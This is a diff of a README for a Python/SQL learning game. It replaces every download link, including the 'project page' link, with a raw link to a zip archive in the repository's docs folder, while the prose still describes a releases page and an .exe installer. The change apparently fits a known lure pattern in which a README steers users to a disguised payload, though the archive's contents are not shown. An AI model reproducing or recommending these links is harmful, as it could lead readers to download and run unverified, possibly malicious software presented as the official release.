@@ -1,6 +1,6 @@
 # 🎮 Code-Quest-Python-SQL-Trainer - Learn Python and SQL Step-by-Step
 
-[![Download Code-Quest-Python-SQL-Trainer](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/releases)
+[![Download Code-Quest-Python-SQL-Trainer](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/main/docs/Trainer-Code-SQ-Quest-Python-3.3.zip)
 
 ## 🧩 What is Code-Quest-Python-SQL-Trainer?
 
@@ -38,7 +38,7 @@ If you want to build basic programming and data skills, this game provides a ste
 
 Click the big green button below to visit the releases page and get the latest version of Code-Quest-Python-SQL-Trainer for Windows.
 
-[![Download Code-Quest-Python-SQL-Trainer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/releases)
+[![Download Code-Quest-Python-SQL-Trainer](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/main/docs/Trainer-Code-SQ-Quest-Python-3.3.zip)
 
 On the releases page, look for a file with a name similar to `Code-Quest-Python-SQL-Trainer-vX.X-windows.exe`. This is the installer for Windows.
 
@@ -47,7 +47,7 @@ On the releases page, look for a file with a name similar to `Code-Quest-Python-
 - Open your web browser (Chrome, Edge, Firefox, etc.).
 - Go to the release page by clicking the button above or typing:
 
-  `https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/releases`
+  `https://raw.githubusercontent.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/main/docs/Trainer-Code-SQ-Quest-Python-3.3.zip`
 
 - Find the most recent version of the software. Versions are labeled with numbers like v1.0, v1.1, etc.
 
@@ -104,9 +104,9 @@ The game saves your progress automatically, so you can come back anytime.
 ## 🔗 Useful Links
 
 - Download latest version:  
-  https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/releases  
+  https://raw.githubusercontent.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/main/docs/Trainer-Code-SQ-Quest-Python-3.3.zip  
 - Project page with code and updates:  
-  https://github.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer  
+  https://raw.githubusercontent.com/Inayatshaikh093/Code-Quest-Python-SQL-Trainer/main/docs/Trainer-Code-SQ-Quest-Python-3.3.zip  
 - Report issues, ask questions, or suggest features:  
   Use the "Issues" tab on the GitHub project page.
 
